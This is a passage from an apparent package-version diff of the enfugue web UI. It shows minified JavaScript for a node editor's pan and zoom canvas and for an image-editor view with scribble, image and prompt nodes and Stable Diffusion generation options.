+import{View}from"../base.mjs";import{FormView}from"../forms/base.mjs";import{InputView}from"../forms/input.mjs";import{ElementBuilder}from"../../base/builder.mjs";import{isEmpty,deepClone,sleep}from"../../base/helpers.mjs";import{NodeEditorDecorationsView,NodeConnectionSpline}from"./decorations.mjs";import{NodeView,OptionsNodeView}from"./base.mjs";const E=new ElementBuilder({node:"enfugue-node",nodeCanvas:"enfugue-node-canvas",editorPosition:"enfugue-node-editor-position",positionReadout:"enfugue-node-editor-position-readout",positionReset:"enfugue-node-editor-position-reset",editorZoom:"enfugue-node-editor-zoom",zoomIn:"enfugue-node-editor-zoom-in",zoomOut:"enfugue-node-editor-zoom-out",zoomReadout:"enfugue-node-editor-zoom-readout",zoomReset:"enfugue-node-editor-zoom-reset"});class NodeEditorView extends View{static tagName="enfugue-node-editor";static canvasWidth="auto";static canvasHeight="auto";static maximumZoom=2;static minimumZoom=.125;static zoomPerScroll=.125;static canMove=!0;static canZoom=!0;static centered=!1;static defaultCursor="default";static disableCursor=!1;static nodeClasses=[NodeView];static classList=["loader-cover"];static zoomInIcon="fa-solid fa-magnifying-glass-plus";static zoomOutIcon="fa-solid fa-magnifying-glass-minus";constructor(t,e,o){super(t),this.zoom=1,this.constructor.centered?("auto"!=this.constructor.canvasWidth&&(this.left=-this.constructor.canvasWidth/2,isEmpty(e)||(this.left+=e/2)),"auto"!=this.constructor.canvasHeight&&(this.top=-this.constructor.canvasHeight/2,isEmpty(o)||(this.top+=o/2))):(this.left=0,this.top=0),this.nodes=[],this.nodeClasses=[].concat(this.constructor.nodeClasses),this.decorations=new NodeEditorDecorationsView(t,this,this.constructor.canvasWidth,this.constructor.canvasHeight),this.resizeCallbacks=[],window.addEventListener("resize",(t=>this.windowResized(t)))}onWindowResize(t){this.resizeCallbacks.push(t)}async windowResized(){if(void 0!==this.node&&!isEmpty(this.node.element)){let[t,e]=[this.node.element.parentElement.clientWidth,this.node.element.parentElement.clientHeight];t<this.width?this.node.addClass("oversize-x"):this.node.removeClass("oversize-x"),e<this.height?this.node.addClass("oversize-y"):this.node.removeClass("oversize-y")}for(let t of this.resizeCallbacks)t()}addNodeClass(t){-1===this.nodeClasses.map((t=>t.name)).indexOf(t.name)&&this.nodeClasses.push(t)}get height(){return"auto"==this.constructor.canvasHeight?void 0!==this.node?this.node.element.clientHeight:0:void 0===this.canvasHeight?this.constructor.canvasHeight:this.canvasHeight}get width(){return"auto"==this.constructor.canvasWidth?void 0!==this.node?this.node.element.clientWidth:0:void 0===this.canvasWidth?this.constructor.canvasWidth:this.canvasWidth}set height(t){if(this.canvasHeight=t,void 0!==this.node){this.node.find(E.getCustomTag("nodeCanvas")).height(t).css("height",`${t}px`),this.decorations.setDimension(this.width,t);for(let t of this.nodes)t.resetDimension()}}set width(t){if(this.canvasWidth=t,void 0!==this.node){this.node.find(E.getCustomTag("nodeCanvas")).width(t).css("width",`${t}px`),this.decorations.setDimension(t,this.height);for(let t of this.nodes)t.resetDimension()}}getState(){return this.nodes.map((t=>t.getState()))}async setState(t){for(let t of this.nodes)this.removeNode(t);let e=this.node.find(E.getCustomTag("nodeCanvas"));for(let o of t){let t=this.nodeClasses.filter((t=>t.name===o.classname)).shift();if(void 0===t)throw"Class name out of scope: "+o.classname;let s=new t(this);this.nodes.push(s),await s.setState(o),e.append(await s.getNode())}this.nodes=this.nodes.map(((t,e)=>(t.index=e,t))),await this.redraw()}redraw(){return isEmpty(this.redrawPromise)&&(this.redrawPromise=new Promise((async(t,e)=>{for(let t of this.nodes)await t.resetDimension();window.requestAnimationFrame((()=>{this.decorations.draw(),this.redrawPromise=null,t()}))}))),this.redrawPromise}async addNode(t){let e=new t(this,...Array.from(arguments).slice(1));if(this.nodes.push(e),this.nodes=this.nodes.map(((t,e)=>(t.index=e,t))),void 0!==this.node){let t=await e.getNode();this.node.find(E.getCustomTag("nodeCanvas")).append(t)}return e}removeNode(t){for(let e of this.nodes)if(e==t)return this.nodes=this.nodes.filter((e=>e!=t)).map(((t,e)=>(t.index=e,t))),void(isEmpty(this.node)||this.node.find(E.getCustomTag("nodeCanvas")).remove(e.node));throw"Could not find node to remove."}focusNode(t){let e=this.nodes.indexOf(t);e!==this.nodes.length-1&&-1!==e&&(this.nodes=this.nodes.slice(0,e).concat(this.nodes.slice(e+1)),this.nodes.push(t),this.node.find(E.getCustomTag("nodeCanvas")).remove(t.node).append(t.node))}async copyNode(t){let e=t.getState(),o=await this.addNode(t.constructor);return e.x+=t.constructor.padding,e.y+=t.constructor.padding,await o.setState(e),this.focusNode(o),o}async build(){let t=await super.build(),e=E.nodeCanvas().css("cursor",this.constructor.defaultCursor),o=E.positionReadout().content("0,0"),s=E.positionReset().content("Reset"),i=E.editorPosition().content(o,s),n=E.zoomReadout().content(`${this.zoom.toFixed(3)}`),a=E.zoomReset().content("Reset"),r=E.zoomIn().content(E.i().class(this.constructor.zoomInIcon)),h=E.zoomOut().content(E.i().class(this.constructor.zoomOutIcon)),c=E.editorZoom().content(r,h,a,n);"auto"==this.constructor.canvasWidth?e.css("width","100%"):e.width(this.width).css("width",`${this.width}px`),"auto"==this.constructor.canvasHeight?e.css("height","100%"):e.height(this.height).css("height",`${this.height}px`),e.css("left",`${this.left}px`),e.css("top",`${this.top}px`),this.decorations.setDimension(this.width,this.height),e.append(await this.decorations.getNode());for(let t of this.nodes)e.append(await t.getNode());if(window.innerWidth<this.width&&t.addClass("oversize-x"),window.innerHeight<this.height&&t.addClass("oversize-y"),t.append(e),this.constructor.disableCursor)t.css("pointer-events","none");else if(this.constructor.canMove&&(t.append(i),e.on("mousedown",(s=>{if(2!==s.which&&(1!==s.which||!s.ctrlKey&&!s.altKey))return;s.preventDefault(),s.stopPropagation();let[i,n]=[s.clientX,s.clientY];e.css("cursor","grabbing"),e.on("mousemove",(s=>{s.preventDefault(),s.stopPropagation();let a,r,[h,c]=[s.clientX-i,s.clientY-n],[d,m]=[this.left+h,this.top+c];if(e.css({left:`${d}px`,top:`${m}px`}),this.constructor.centered){let e=this.constructor.canvasWidth/2-t.element.clientWidth/2,o=this.constructor.canvasHeight/2-t.element.clientHeight/2;a=-e-d/this.zoom,r=-o-m/this.zoom}else a=-d/this.zoom,r=-m/this.zoom;1!=this.zoom&&(a=a.toFixed(2),r=r.toFixed(2)),o.content(`${a},${r}`)})).on("mouseup,mouseleave",(s=>{s.preventDefault(),s.stopPropagation();let a,r,[h,c]=[s.clientX-i,s.clientY-n];if(this.left+=h,this.top+=c,e.off("mouseup,mousemove,mouseleave"),e.css({left:`${this.left}px`,top:`${this.top}px`,cursor:this.constructor.defaultCursor}),this.constructor.centered){let e=this.constructor.canvasWidth/2-t.element.clientWidth/2,o=this.constructor.canvasHeight/2-t.element.clientHeight/2;a=-e-this.left/this.zoom,r=-o-this.top/this.zoom}else a=-this.left/this.zoom,r=-this.top/this.zoom;1!=this.zoom&&(a=a.toFixed(2),r=r.toFixed(2)),o.content(`${a},${r}`)}))})),s.on("click",(s=>{s.preventDefault(),s.stopPropagation(),this.constructor.centered?(this.left=-this.constructor.canvasWidth/2*this.zoom+t.element.clientWidth/2,this.top=-this.constructor.canvasHeight/2*this.zoom+t.element.clientHeight/2):(this.left=0,this.top=0),o.content("0,0"),e.css({left:`${this.left}px`,top:`${this.top}px`})}))),this.constructor.canZoom){t.append(c);let i=(s,i,a)=>{let r=s-this.zoom,h=-i*r,c=-a*r;if(this.left+=h,this.top+=c,this.zoom=s,n.content(this.zoom.toFixed(3)),e.css({left:`${this.left}px`,top:`${this.top}px`,transform:`scale(${this.zoom})`}),this.constructor.canMove){let e,s;if(this.constructor.centered){let o=this.constructor.canvasWidth/2-t.element.clientWidth/2,i=this.constructor.canvasHeight/2-t.element.clientHeight/2;e=-o-this.left/this.zoom,s=-i-this.top/this.zoom}else e=-this.left/this.zoom,s=-this.top/this.zoom;1!=this.zoom&&(e=e.toFixed(2),s=s.toFixed(2)),o.content(`${e},${s}`)}this.zoom>1?t.addClass("zoom-in"):t.removeClass("zoom-in"),this.zoom<1?t.addClass("zoom-out"):t.removeClass("zoom-out")};e.on("wheel",(t=>{if("ENFUGUE-NODE-CANVAS"!==t.target.tagName){let e=t.deltaY>0,o=t.target;for(;null!=o&&"ENFUGUE-NODE-EDITOR"!==o.tagName&&"ENFUGUE-NODE-CANVAS"!==o.tagName;){if(o.scrollHeight!==o.offsetHeight&&"ENFUGUE-NODE-CONTENTS"!==o.tagName){let t=o.offsetHeight+o.scrollTop,s=getComputedStyle(o).overflowY;if(-1!==["auto","scroll"].indexOf(s)){if(o.scrollHeight-t>1&&e)return;if(o.scrollTop>0&&!e)return}}o=o.parentElement}}t.preventDefault(),t.stopPropagation();let e,o=1;this.zoom>=5?o=4:this.zoom>=2.5&&(o=2),e=t.deltaY<0?this.zoom+this.constructor.zoomPerScroll*o:this.zoom-this.constructor.zoomPerScroll*o;let s=t.target,n=t.offsetX,a=t.offsetY;for(;"ENFUGUE-NODE-CANVAS"!=s.tagName&&"ENFUGUE-NODE-EDITOR-CANVAS"!=s.tagName;)n+=s.offsetLeft,a+=s.offsetTop,s=s.parentElement;e>=this.constructor.minimumZoom&&e<=this.constructor.maximumZoom&&e!=this.zoom&&i(e,n,a)})),r.on("click",(t=>{t.preventDefault(),t.stopPropagation();let e=this.zoom+this.constructor.zoomPerScroll;e>=this.constructor.minimumZoom&&e<=this.constructor.maximumZoom&&e!=this.zoom&&i(e,this.width/2,this.height/2)})).on("dblclick",(t=>{t.preventDefault()})),h.on("click",(t=>{t.preventDefault(),t.stopPropagation();let e=this.zoom-this.constructor.zoomPerScroll;e>=this.constructor.minimumZoom&&e<=this.constructor.maximumZoom&&e!=this.zoom&&i(e,this.width/2,this.height/2)})).on("dblclick",(t=>{t.preventDefault()})),a.on("click",(t=>{t.preventDefault(),t.stopPropagation(),this.zoom=1,n.content("1.000"),e.css({transform:"scale(1)"}),s.trigger("click")}))}return t}}class NodesView extends NodeEditorView{static tagName="enfugue-nodes";static canMove=!1;static canZoom=!1}export{NodeEditorView,NodesView};
```

### Comparing `enfugue-0.1.3/enfugue/static/js/view/nodes/image-editor.mjs` & `enfugue-0.2.0/enfugue/static/js/view/nodes/image-editor.mjs`

 * *Files 9% similar despite different names*

```diff
@@ -1 +1 @@
-import{NodeView,OptionsNodeView}from"./base.mjs";import{ImageView,BackgroundImageView}from"../image.mjs";import{NodeEditorView}from"./editor.mjs";import{ElementBuilder}from"../../base/builder.mjs";import{isEmpty}from"../../base/helpers.mjs";import{SimpleNotification}from"../../common/notify.mjs";import{FormView}from"../forms/base.mjs";import{ToolbarView}from"../menu.mjs";import{ScribbleView}from"../scribble.mjs";import{SelectInputView,CheckboxInputView,FloatInputView,NumberInputView,TextInputView}from"../forms/input.mjs";const E=new ElementBuilder,filterEmpty=e=>{let t={};for(let i in e)isEmpty(e[i])||(t[i]=e[i]);return t};class InvocationToolbarView extends ToolbarView{constructor(e){super(e.config),this.invocationNode=e}async onMouseEnter(e){this.invocationNode.toolbarEntered()}async onMouseLeave(e){this.invocationNode.toolbarLeft()}async build(){let e=await super.build();return e.on("mouseenter",(e=>this.onMouseEnter(e))),e.on("mouseleave",(e=>this.onMouseLeave(e))),e}}class CurrentInvocationImageView extends ImageView{constructor(e){super(e.config),this.editor=e}static className="current-invocation-image-view";static hideTime=250;async getTools(){return isEmpty(this.toolbar)&&(this.toolbar=new InvocationToolbarView(this),navigator.clipboard&&"function"==typeof ClipboardItem&&(this.copyImage=await this.toolbar.addItem("Copy to Clipboard","fa-solid fa-clipboard"),this.copyImage.onClick((()=>this.copyToClipboard()))),this.popoutImage=await this.toolbar.addItem("Popout Image","fa-solid fa-arrow-up-right-from-square"),this.popoutImage.onClick((()=>this.sendToWindow())),this.saveImage=await this.toolbar.addItem("Save As","fa-solid fa-floppy-disk"),this.saveImage.onClick((()=>this.saveToDisk())),this.editImage=await this.toolbar.addItem("Edit Image","fa-solid fa-pen-to-square"),this.editImage.onClick((()=>this.sendToCanvas()))),this.toolbar}async copyToClipboard(){navigator.clipboard.write([new ClipboardItem({"image/png":await this.getBlob()})]),SimpleNotification.notify("Copied to clipboard!",2e3)}async saveToDisk(){this.editor.application.saveBlobAs("Save Image",await this.getBlob(),".png")}async sendToCanvas(){this.editor.application.initializeStateFromImage(await this.getImageAsDataURL())}async sendToWindow(){window.open(this.src)}async toolbarEntered(){this.stopHideTimer()}async toolbarLeft(){this.startHideTimer()}stopHideTimer(){clearTimeout(this.timer)}startHideTimer(){this.timer=setTimeout((async()=>{let e=await this.lock.acquire(),t=await this.getTools();this.node.element.parentElement.removeChild(await t.render()),e()}),this.constructor.hideTime)}async onMouseEnter(e){this.stopHideTimer();let t=await this.lock.acquire(),i=await this.getTools();this.node.element.parentElement.appendChild(await i.render()),t()}async onMouseLeave(e){this.startHideTimer()}async build(){let e=await super.build();return e.on("mouseenter",(e=>this.onMouseEnter(e))),e.on("mouseleave",(e=>this.onMouseLeave(e))),e}}class ImageEditorImageControlNetInputView extends SelectInputView{static defaultValue="canny";static defaultOptions={canny:"Canny Edge Detection",hed:"Holistically-nested Edge Detection (HED)",mlsd:"Mobile Line Segment Detection (MLSD)"};static tooltip="The ControlNet to use depends on your input image. Unless otherwise specified, your input image will be processed through the appropriate algorithm for this ControlNet prior to diffusion.<br /><strong>Canny Edge</strong>: This network is trained on images and the edges of that image after having run through Canny Edge detection.<br /><strong>HED</strong>: Short for Holistically-Nested Edge Detection, this edge-detection algorithm is best used when the input image is too blurry or too noisy for Canny Edge detection.<br /><strong>MLSD</strong>: Short for Mobile Line Segment Detection, this edge-detection algorithm searches only for straight lines, and is best used for geometric or architectural images."}class ImageEditorImageFitInputView extends SelectInputView{static defaultValue="actual";static defaultOptions={actual:"Actual Size",stretch:"Stretch",contain:"Contain",cover:"Cover"};static tooltip="Fit this image within it's container.<br /><strong>Actual</strong>: Do not manipulate the dimensions of the image, anchor it as specified in the frame.<br /><strong>Stretch</strong>: Force the image to fit within the frame, regardles sof original dimensions. When using this mode, anchor has no effect.<br /><strong>Contain</strong>: Scale the image so that it's largest dimension is contained within the frames bounds, adding negative space to fill the rest of the frame.<br /><strong>Cover</strong>: Scale the image so that it's smallest dimension is contained within the frame bounds, cropping the rest of the image as needed."}class ImageEditorImageAnchorInputView extends SelectInputView{static defaultValue="top-left";static defaultOptions={"top-left":"Top Left","top-center":"Top Center","top-right":"Top Right","center-left":"Center Left","center-center":"Center Center","center-right":"Center Right","bottom-left":"Bottom Left","bottom-center":"Bottom Center","bottom-right":"Bottom Right"};static tooltip="When the size of the frame and the size of the image do not match, this will control where the image is placed. View the 'fit' field for more options to fit images in the frame."}class ImageEditorBaseOptionsFormView extends FormView{static fieldSets={Prompts:{prompt:{label:"Prompt",class:TextInputView,config:{tooltip:"This prompt will control what is in this frame. When left blank, the global prompt will be used."}},negativePrompt:{label:"Negative Prompt",class:TextInputView,config:{tooltip:"This prompt will control what is in not this frame. When left blank, the global negative prompt will be used."}}},Tweaks:{guidanceScale:{label:"Guidance Scale",class:FloatInputView,config:{min:0,max:100,step:.1,value:7.5,tooltip:"How closely to follow the text prompt; high values result in high-contrast images closely adhering to your text, low values result in low-contrast images with more randomness."}},inferenceSteps:{label:"Inference Steps",class:NumberInputView,config:{min:5,max:250,step:1,value:50,tooltip:"How many steps to take during primary inference, larger values take longer to process."}}},Other:{scaleToModelSize:{label:"Scale to Model Size",class:CheckboxInputView,config:{value:!0,tooltip:"When this node has any dimension smaller than the size of the configured model, scale it up so it's smallest dimension is the same size as the model, then scale it down after diffusion.<br />This generally improves image quality in rectangular shapes, but can also result in ghosting and increased processing time.<br />This will have no effect if your node is larger than the model size in all dimensions.<br />If unchecked and your node is smaller than the model size, TensorRT will be disabled for this node."}},removeBackground:{label:"Remove Background",class:CheckboxInputView,config:{tooltip:"After diffusion, run the resulting image though an AI background removal algorithm. This can improve image consistency when using multiple nodes."}}}};static autoSubmit=!0;static className="options-form-view"}class ImageEditorImageNodeOptionsFormView extends FormView{static fieldSets={Base:{fit:{label:"Image Fit",class:ImageEditorImageFitInputView},anchor:{label:"Image Anchor",class:ImageEditorImageAnchorInputView},inpaint:{label:"Use for Inpainting",class:CheckboxInputView,config:{tooltip:"When checked, you will be able to paint where on the image you wish for the AI to fill in details. Any gaps in the frame or transparency in the image will also be filled."}},infer:{label:"Use for Inference",class:CheckboxInputView,config:{tooltip:"When checked, use this image as input for primary diffusion. Inpainting will be performed first, filling any painted sections as well as gaps in the frame and transparency in the image."}},control:{label:"Use for Control",class:CheckboxInputView,config:{tooltip:"When checked, use this image as input for ControlNet. Inpainting will be performed first, filling any painted sections as well as gaps in the frame and transparency in the image.<br />Unless otherwise specified, your image will be processed using the appropriate algorithm for the chosen ControlNet."}}},Other:{scaleToModelSize:{label:"Scale to Model Size",class:CheckboxInputView,config:{value:!0,tooltip:"When this has any dimension smaller than the size of the configured model, scale it up so it's smallest dimension is the same size as the model, then scale it down after diffusion.<br />This generally improves image quality in rectangular shapes, but can also result in ghosting and increased processing time.<br />This will have no effect if your node is larger than the model size in all dimensions.<br />If unchecked and your node is smaller than the model size, TensorRT will be disabled for this node."}},removeBackground:{label:"Remove Background",class:CheckboxInputView,config:{tooltip:"Before processing, run this image through an AI background removal process. If you are additionally inpainting, inferencing or using this image for ControlNet, that background will then be filled in within this frame. If you are not, that background will be filled when the overall canvas image is finally painted in."}}},Prompts:{prompt:{label:"Prompt",class:TextInputView,config:{tooltip:"This prompt will control what is in this frame. When left blank, the global prompt will be used."}},negativePrompt:{label:"Negative Prompt",class:TextInputView,config:{tooltip:"This prompt will control what is in not this frame. When left blank, the global negative prompt will be used."}}},Tweaks:{guidanceScale:{label:"Guidance Scale",class:FloatInputView,config:{min:0,max:100,step:.1,value:7.5,tooltip:"How closely to follow the text prompt; high values result in high-contrast images closely adhering to your text, low values result in low-contrast images with more randomness."}},inferenceSteps:{label:"Inference Steps",class:NumberInputView,config:{min:5,max:250,step:1,value:50,tooltip:"How many steps to take during primary inference, larger values take longer to process."}}},Inference:{strength:{label:"Denoising Strength",class:FloatInputView,config:{min:0,max:1,step:.01,value:.8,config:"How much of the input image to replace with new information. A value of 1.0 represents total input image destruction, and 0.0 represents no image modifications being made."}}},Control:{controlnet:{label:"ControlNet",class:ImageEditorImageControlNetInputView},conditioningScale:{label:"Conditioning Scale",class:FloatInputView,config:{min:0,max:1,step:.01,value:1,config:"How closely to follow ControlNet's influence."}},processControlImage:{label:"Process Image for ControlNet",class:CheckboxInputView,config:{value:!0,tooltip:"When checked, the image will be processed through the appropriate edge detection algorithm for the ControlNet. Only uncheck this if your image has already been processed through edge detection."}}}};static fieldSetConditions={Prompts:e=>e.infer||e.inpaint||e.control,Tweaks:e=>e.infer||e.inpaint||e.control,Inference:e=>e.infer,Control:e=>e.control};static autoSubmit=!0;static className="image-options-form-view"}class ImageEditorNodeView extends NodeView{static canFlipHeader=!0;static minHeight=32;static minWidth=32;static snapSize=8;static padding=8;static edgeHandlerTolerance=8;static hideHeader=!0;static closeText="Remove";static nodeButtons={anchor:{icon:"fa-solid fa-sliders",tooltip:"Show/Hide Options",callback:function(){this.toggleOptions()}}};static optionsFormView=ImageEditorBaseOptionsFormView;async updateOptions(e){this.prompt=e.prompt,this.negativePrompt=e.negativePrompt,this.guidanceScale=e.guidanceScale,this.inferenceSteps=e.inferenceSteps,this.scaleToModelSize=e.scaleToModelSize,this.removeBackground=e.removeBackground}async toggleOptions(){if(isEmpty(this.optionsForm)){this.optionsForm=new this.constructor.optionsFormView(this.config),this.optionsForm.onSubmit((e=>this.updateOptions(e)));let e=await this.optionsForm.getNode();this.optionsForm.setValues(this.getState()),this.node.find("enfugue-node-contents").append(e)}else this.optionsForm.hidden?this.optionsForm.show():this.optionsForm.hide()}setState(e){super.setState({name:e.name,x:e.x-this.constructor.padding,y:e.y-this.constructor.padding,h:e.h+2*this.constructor.padding,w:e.w+2*this.constructor.padding}),this.updateOptions(e),isEmpty(this.optionsForm)||this.optionsForm.setValues(e)}getState(){let e=super.getState();return e.prompt=this.prompt||null,e.negativePrompt=this.negativePrompt||null,e.guidanceScale=this.guidanceScale||7.5,e.inferenceSteps=this.inferenceSteps||50,e.removeBackground=this.removeBackground||!1,e.scaleToModelSize=this.scaleToModelSize||!0,e}}class ImageEditorPromptNodeView extends ImageEditorNodeView{static hideHeader=!1;static canFlipHeader=!1;static nodeName="Prompt";static nodeButtons={};static className="image-editor-prompt-node-view";constructor(e,t,i,o,s,n,a){let r=new ImageEditorBaseOptionsFormView(e.config);super(e,t,r,o,s,n,a),r.onSubmit((e=>this.updateOptions(e)))}getState(){let e=super.getState();return e={...e,...this.content.values},e}async setState(e){await super.setState(e),await this.content.getNode(),await this.content.setValues(e)}}class ImageEditorScribbleNodeView extends ImageEditorNodeView{static pencilSquareIcon="fa-regular fa-square";static pencilSquareTooltip="Change Pencil Shape to Square";static pencilCircleIcon="fa-regular fa-circle";static pencilCircleTooltip="Change Pencil Shape to Circle";static eraserIcon="fa-solid fa-eraser";static eraserTooltip="Switch to Eraser (Hold <code>alt</code> To Quick-Toggle)";static pencilIcon="fa-solid fa-pencil";static pencilTooltip="Switch Back to Pencil";static nodeButtons={...ImageEditorNodeView.nodeButtons,shape:{icon:ImageEditorScribbleNodeView.pencilSquareIcon,tooltip:ImageEditorScribbleNodeView.pencilSquareTooltip,callback:function(){this.togglePencilShape()}},erase:{icon:ImageEditorScribbleNodeView.eraserIcon,tooltip:ImageEditorScribbleNodeView.eraserTooltip,callback:function(){this.toggleEraser()}},clear:{icon:"fa-solid fa-delete-left",tooltip:"Clear the entire canvas.",callback:function(){this.scribbleView.clearMemory()}},increase:{icon:"fa-solid fa-plus",tooltip:"Increase Pencil Size",callback:function(){this.scribbleView.increaseSize()}},decrease:{icon:"fa-solid fa-minus",tooltip:"Decrease Pencil Size",callback:function(){this.scribbleView.decreaseSize()}}};togglePencilShape(){let e=this.scribbleView.shape,t=this.node.find(".node-button-shape"),i=t.find("i");"circle"===e?(this.scribbleView.shape="square",t.data("tooltip",this.constructor.pencilCircleTooltip),i.class(this.constructor.pencilCircleIcon)):(this.scribbleView.shape="circle",t.data("tooltip",this.constructor.pencilSquareTooltip),i.class(this.constructor.pencilSquareIcon))}toggleEraser(){let e=!0===this.scribbleView.isEraser,t=this.node.find(".node-button-erase"),i=t.find("i");e?(this.scribbleView.isEraser=!1,t.data("tooltip",this.constructor.eraserTooltip),i.class(this.constructor.eraserIcon)):(this.scribbleView.isEraser=!0,this.scribbleView.shape="circle",t.data("tooltip",this.constructor.pencilTooltip),i.class(this.constructor.pencilIcon))}constructor(e,t,i,o,s,n,a){super(e,t,new ScribbleView(e.config,n,a),o,s,n,a),this.scribbleView=this.content}async resized(){super.resized(),this.scribbleView.resizeCanvas(this.visibleWidth-2*this.constructor.padding,this.visibleHeight-2*this.constructor.padding)}getState(){let e=super.getState();return e.src=this.scribbleView.src,e}setState(e){if(super.setState(e),isEmpty(e.src))this.scribbleView.clearMemory();else{let t=new Image;t.onload=()=>this.scribbleView.setMemory(t),t.src=e.src}}}class ImageEditorImageNodeView extends ImageEditorScribbleNodeView{static allFitModes=["actual","stretch","cover","contain"];static allAnchorModes=["top-left","top-center","top-right","center-left","center-center","center-right","bottom-left","bottom-center","bottom-right"];static scribbleButtons=["erase","shape","clear","increase","decrease"];static className="image-editor-image-node-view";static nodeButtons={...ImageEditorScribbleNodeView.nodeButtons,"mirror-x":{icon:"fa-solid fa-left-right",tooltip:"Mirror the image horizontally.",callback:function(){this.mirrorHorizontally()}},"mirror-y":{icon:"fa-solid fa-up-down",tooltip:"Mirror the image vertically.",callback:function(){this.mirrorVertically()}},"rotate-clockwise":{icon:"fa-solid fa-rotate-right",tooltip:"Rotate the image clockwise by 90 degrees.",callback:function(){this.rotateClockwise()}},"rotate-counter-clockwise":{icon:"fa-solid fa-rotate-left",tooltip:"Rotate the image counter-clockwise by 90 degrees.",callback:function(){this.rotateCounterClockwise()}}};static optionsFormView=ImageEditorImageNodeOptionsFormView;constructor(e,t,i,o,s,n,a){i instanceof ImageView&&(i=new BackgroundImageView(i.config,i.src)),super(e,t,null,o,s,n,a),this.scribbleView=this.content,this.content=i,this.scribbleView.hide()}async updateOptions(e){if(super.updateOptions(e),this.updateFit(e.fit),this.updateAnchor(e.anchor),this.infer=e.infer,this.control=e.control,this.inpaint=e.inpaint,this.strength=e.strength,this.controlnet=e.controlnet,this.conditioningScale=e.conditioningScale,this.processControlImage=e.processControlImage,void 0!==this.node){let e=this.node.find("enfugue-node-header");if(this.inpaint){this.scribbleView.show();for(let t of this.constructor.scribbleButtons)e.find(`.node-button-${t}`).show()}else{this.scribbleView.hide();for(let t of this.constructor.scribbleButtons)e.find(`.node-button-${t}`).hide()}}}async updateFit(e){this.fit=e;let t=await this.getContent();t.fit=e;for(let e of this.constructor.allFitModes)t.removeClass(`fit-${e}`);isEmpty(e)||t.addClass(`fit-${e}`)}async updateAnchor(e){this.anchor=e;let t=await this.getContent();for(let e of this.constructor.allAnchorModes)t.removeClass(`anchor-${e}`);isEmpty(e)||t.addClass(`anchor-${e}`)}async build(){let e=await super.build();e.find("enfugue-node-contents").append(await this.scribbleView.getNode());let t=e.find("enfugue-node-header");for(let e of this.constructor.scribbleButtons)t.find(`.node-button-${e}`).hide();return e}mirrorHorizontally(){return this.content.mirrorHorizontally()}mirrorVertically(){return this.content.mirrorVertically()}rotateClockwise(){return this.content.rotateClockwise()}rotateCounterClockwise(){return this.content.rotateCounterClockwise()}getState(){let e=super.getState();return e.scribbleSrc=this.scribbleView.src,e.src=this.content.src,e.anchor=this.anchor||null,e.fit=this.fit||null,e.infer=this.infer||!1,e.control=this.control||!1,e.inpaint=this.inpaint||!1,e.strength=this.strength||.8,e.controlnet=this.controlnet||null,e.processControlImage=this.processControlImage||!0,e.conditioningScale=this.conditioningScale||1,e.removeBackground=this.removeBackground||!1,e.scaleToModelSize=this.scaleToModelSize||!0,e}async setState(e){if(await this.setContent(new BackgroundImageView(this.config,e.src)),await this.updateAnchor(e.anchor),await this.updateFit(e.fit),e.inpaint){let t=new Image;t.onload=()=>{if(this.scribbleView.setMemory(t),this.scribbleView.show(),void 0!==this.node){let e=this.node.find("enfugue-node-header");for(let t of this.constructor.scribbleButtons)e.find(`.node-button-${t}`).show()}},t.src=e.scribbleSrc}else if(this.scribbleView.clearMemory(),this.scribbleView.hide(),void 0!==this.node){let e=this.node.find("enfugue-node-header");for(let t of this.constructor.scribbleButtons)e.find(`.node-button-${t}`).hide()}await super.setState({...e,src:null})}static getDefaultState(){return{classname:this.name,inpaint:!1,control:!1,inpaint:!1,inferenceSteps:50,guidanceScale:7.5,strength:.8,processControlImage:!0,conditioningScale:1,removeBackground:!1,scaleToModelSize:!0}}}class ImageEditorView extends NodeEditorView{constructor(e){super(e.config,window.innerWidth-300,window.innerHeight-70),this.application=e}static canvasWidth=512;static canvasHeight=512;static centered=!0;static className="image-editor";static maximumZoom=10;static nodeClasses=[ImageEditorScribbleNodeView,ImageEditorImageNodeView,ImageEditorPromptNodeView];hideCurrentInvocation(){this.currentInvocation.hide(),this.removeClass("has-image"),isEmpty(this.configuredWidth)||isEmpty(this.configuredHeight)||(this.width=this.configuredWidth,this.height=this.configuredHeight,this.configuredHeight=null,this.configuredWidth=null)}async setCurrentInvocationImage(e){this.currentInvocation.setImage(e),await this.currentInvocation.waitForLoad(),this.currentInvocation.width==this.width&&this.currentInvocation.height==this.height||(isEmpty(this.configuredWidth)&&(this.configuredWidth=this.width),isEmpty(this.configuredHeight)&&(this.configuredHeight=this.height),this.width=this.currentInvocation.width,this.height=this.currentInvocation.height),this.currentInvocation.show(),this.addClass("has-image")}getNextNodePoint(){let e=this.nodes.map((e=>e.left+ImageEditorNodeView.padding)),t=this.nodes.map((e=>e.top+ImageEditorNodeView.padding)),[i,o]=[0,0];for(;-1!==e.indexOf(i);)i+=ImageEditorNodeView.snapSize;for(;-1!==t.indexOf(o);)o+=ImageEditorNodeView.snapSize;return[i,o]}async addImageNode(e,t="Image"){let i=new ImageView(this.config,e),[o,s]=this.getNextNodePoint();return await i.waitForLoad(),await this.addNode(ImageEditorImageNodeView,t,i,o,s,i.width,i.height)}async addScribbleNode(e="Scribble"){let[t,i]=this.getNextNodePoint();return await this.addNode(ImageEditorScribbleNodeView,e,null,t,i,256,256)}async addPromptNode(e="Prompt"){let[t,i]=this.getNextNodePoint();return await this.addNode(ImageEditorPromptNodeView,e,null,t,i,256,256)}async build(){let e=await super.build(),t=E.createElement("enfugue-image-editor-grid");return this.currentInvocation=new CurrentInvocationImageView(this),this.currentInvocation.hide(),e.find("enfugue-node-canvas").append(t,await this.currentInvocation.getNode()),e}static getNodeDataForImage(e){return{...{x:0,y:0,w:e.width,h:e.height,src:e.src,name:"Initial Image"},...ImageEditorImageNodeView.getDefaultState()}}}export{ImageEditorView,ImageEditorNodeView,ImageEditorImageNodeView,ImageEditorScribbleNodeView};
